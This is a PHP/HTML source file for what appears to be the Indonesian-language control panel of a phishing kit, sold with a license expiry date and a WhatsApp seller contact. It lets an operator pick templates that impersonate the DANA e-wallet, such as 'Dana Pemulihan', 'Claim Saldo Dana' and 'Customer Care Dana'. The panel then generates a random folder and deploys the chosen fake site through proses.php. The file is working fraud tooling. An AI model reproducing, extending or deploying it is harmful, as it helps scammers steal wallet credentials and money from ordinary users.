<?php
session_start();

date_default_timezone_set('Asia/Jakarta');

include 'config.php';

function validateExpiredDate($date) {
    
    if (!preg_match('/^\d{4}-\d{2}-\d{2}$/', $date)) {
        return ['valid' => false, 'error' => 'Format salah! Harus: Y-m-d (contoh: 2025-12-15)'];
    }
    
    
    list($year, $month, $day) = explode('-', $date);
    
    
    if ($year < 1900 || $year > 2100) {
        return ['valid' => false, 'error' => "Tahun tidak valid: {$year}. Harus antara 1900-2100"];
    }
    
    
    if ($month < 1 || $month > 12) {
        return ['valid' => false, 'error' => "Bulan tidak valid: {$month}. Harus antara 01-12"];
    }
    
    
    if (!checkdate($month, $day, $year)) {
        return ['valid' => false, 'error' => "Tanggal tidak valid: {$date}. Cek jumlah hari di bulan {$month}"];
    }
    
    return ['valid' => true, 'error' => null];
}


$validation = validateExpiredDate($expired_date);

if (!$validation['valid']) {
    die("<h2>❌ Error di config.php</h2><p><strong>\$expired_date</strong>: '{$expired_date}'</p><p style='color:red;'>{$validation['error']}</p>");
}


$today = date('Y-m-d');

if ($today > $expired_date) {
    
    if (file_exists($expired_file)) {
        include $expired_file;
        exit; 
    } else {
        die("Error: File {$expired_file} tidak ditemukan!");
    }
}


?>
<?php
function generateRandomSubdomain($length = 30) {
    $characters = 'abcdefghijklmnopqrstuvwxyz0123456789-';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

$subdomain = generateRandomSubdomain();
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"/>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <title>WEBP 〄 ᖽᐸ —ＣＯＮＫ</title>
  <style>
    @font-face {
      font-family: 'ibm';
      src: url('https://saweria.co/ibm-plex-mono-latin-400.woff');
    }
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'ibm', monospace;
    }
    html, body {
      height: 100%;
      background: #F7FAFC;
    }
    body {
      display: flex;
      flex-direction: column;
      padding: 20px;
    }
    .gateway {
      max-width: 650px;
      width: 100%;
      background: white;
      border-radius: 12px;
      padding: 25px;
      box-shadow: 0 8px 20px rgba(0,0,0,0.08);
      margin: auto;
      position: relative;
    }
    .source {
      position: absolute;
      top: -15px;
      right: -15px;
      padding: 10px 15px;
      background: #2ecc71;
      color: white;
      font-weight: bold;
      font-size: 14px;
      box-shadow: 3px 3px 0 #222;
      border: 2px solid #000;
      border-radius: 8px;
      cursor: pointer;
    }
    .form {
      display: flex;
      flex-direction: column;
      gap: 20px;
      margin-top: 10px;
    }
    .form label {
      display: flex;
      flex-direction: column;
      font-weight: bold;
      color: #2D3748;
    }
    label select, label input {
      height: 40px;
      border: 1px solid #CBD5E0;
      border-radius: 6px;
      padding: 5px 10px;
      background: #EDF2F7;
      font-size: 15px;
      box-shadow: 1px 1px 0 #222;
    }
    .form button {
      margin-top: 10px;
      padding: 10px 18px;
      background: #fbbf24;
      border: 2px solid #000;
      border-radius: 6px;
      font-weight: bold;
      box-shadow: 2px 2px 0 #222;
      transition: background 0.2s;
    }
    .form button:hover {
      background: #facc15;
      cursor: pointer;
    }
    .hidden {
      display: none;
    }
    .preview-img-container {
      text-align: center;
      margin-top: 10px;
    }
    .preview-img {
      max-width: 100%;
      border: 2px solid #333;
      border-radius: 10px;
      box-shadow: 3px 3px 8px rgba(0,0,0,0.2);
    }
    .section-box {
      border: 1px solid #CBD5E0;
      border-radius: 10px;
      padding: 15px;
      background: #F1F5F9;
      box-shadow: 2px 2px 0 #222;
      margin-top: 15px;
    }
    .section-title {
      font-weight: bold;
      font-size: 16px;
      margin-bottom: 10px;
      color: #1A202C;
    }
    footer {
      text-align: center;
      padding: 15px 0;
      font-size: 14px;
      color: #4A5568;
    }
    footer a {
      margin-left: 5px;
      text-decoration: none;
      color: #2B6CB0;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="gateway">
    <div onclick="toggleSource()" class="source">WEBP DANA</div>

    <div class="form">
      <label for="list">TAMPILAN
        <select id="list">
        <option selected disabled>Pilih terlebih dahulu...</option>
        <option value="tamp1">Dana Pemulihan</option>
        <option value="tamp2">Dana Kaget</option>
        <option value="tamp3">Claim Saldo Dana</option>       
        <option value="tamp4">Dana Pusat Bantuan</option>
        <option value="tamp5">Customer Care Dana</option>
      </select>
    </label>

      <label>NAMA FOLDER
        <input id="subdo-main" name="subdo" type="text" readonly value="<?= $subdomain ?>">
      </label>

      <?php for ($i = 1; $i <= 30; $i++): ?>
        <div class="hidden" id="tamp<?= $i ?>">
          <form method="post" action="proses.php">
            <div class="section-box">
              <div class="section-title">Pemilihan Web</div>
              <input type="hidden" name="nomor" value="<?= $i ?>">
              <input type="hidden" name="subdo" class="subdo-input" value="<?= $subdomain ?>">
              <button type="submit" name="trigger_alpha_92">BUAT WEB</button>
            </div>

            <div class="section-box">
              <div class="section-title">Preview Gambar</div>
              <div class="preview-img-container">
                <img class="preview-img" id="preview-img-<?= $i ?>" src="" alt="Preview" style="display:none;">
              </div>
            </div>
          </form>
        </div>
      <?php endfor; ?>
    </div>
  </div>

  <footer>
     <a href="https://wa.me/6287700095550">〄 ᖽᐸ —ＣＯＮＫ</a>
  </footer>

  <script>
    function toggleSource() {
      window.location = 'https://wa.me/6287700095550';
    }

    const previewImages = {
tamp1: 'https://files.catbox.moe/h268l9.jpg',
tamp2: 'https://files.catbox.moe/mnlvvl.jpg',
tamp3: 'https://cdn.jsdelivr.net/gh/sisstem-google/terbaru@main/IMG_20250705_024150.jpg',
tamp4: 'https://cdn.jsdelivr.net/gh/sisstem-google/terbaru@main/IMG_20250705_024040.jpg',
tamp5: 'https://cdn.jsdelivr.net/gh/sisstem-google/terbaru@main/IMG_20250705_025249.jpg',
tamp6: 'https://cahyosr.my.id/imgweb/6.jpg',
tamp7: 'https://cahyosr.my.id/imgweb/7.jpg',
tamp8: 'https://cahyosr.my.id/imgweb/8.jpg',
tamp9: 'https://cahyosr.my.id/imgweb/9.jpg',
tamp10: 'https://cahyosr.my.id/imgweb/10.jpg',
tamp11: 'https://cahyosr.my.id/imgweb/11.jpg',
tamp12: 'https://cahyosr.my.id/imgweb/12.jpg',
tamp13: 'https://cahyosr.my.id/imgweb/13.jpg',
tamp14: 'https://cahyosr.my.id/imgweb/14.jpg',
tamp15: 'https://cahyosr.my.id/imgweb/15.jpg',
tamp16: 'https://cahyosr.my.id/imgweb/16.jpg',
tamp17: 'https://cahyosr.my.id/imgweb/17.jpg',
tamp18: 'https://cahyosr.my.id/imgweb/18.jpg',
tamp19: 'https://cahyosr.my.id/imgweb/19.jpg',
tamp20: 'https://cahyosr.my.id/imgweb/20.jpg',
tamp21: 'https://cahyosr.my.id/imgweb/21.jpg',
tamp22: 'https://cahyosr.my.id/imgweb/22.jpg',
tamp23: 'https://cahyosr.my.id/imgweb/23.jpg',
tamp24: 'https://cahyosr.my.id/imgweb/24.jpg',
tamp25: 'https://cahyosr.my.id/imgweb/25.jpg',
tamp26: 'https://cahyosr.my.id/imgweb/26.jpg',
tamp27: 'https://cahyosr.my.id/imgweb/27.jpg',
tamp28: 'https://cahyosr.my.id/imgweb/28.jpg',
tamp29: 'https://cahyosr.my.id/imgweb/29.jpg',
tamp30: 'https://cahyosr.my.id/imgweb/30.jpg',
    };

    function generateRandomSubdomain(length = 30) {
      const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
      let result = '';
      for (let i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
      }
      return result;
    }

    function showElement(id) {
      document.querySelectorAll('.hidden').forEach(el => el.style.display = 'none');
      document.getElementById(id).style.display = 'block';
    }

    document.getElementById('list').addEventListener('change', function () {
      const selected = this.value;
      const newSub = generateRandomSubdomain();

      document.getElementById('subdo-main').value = newSub;
      document.querySelectorAll('.subdo-input').forEach(input => input.value = newSub);

      showElement(selected);

      const img = document.querySelector(`#${selected} .preview-img`);
      if (previewImages[selected]) {
        img.src = previewImages[selected];
        img.style.display = 'block';
      } else {
        img.style.display = 'none';
      }
    });
  </script>
</body>
</html>
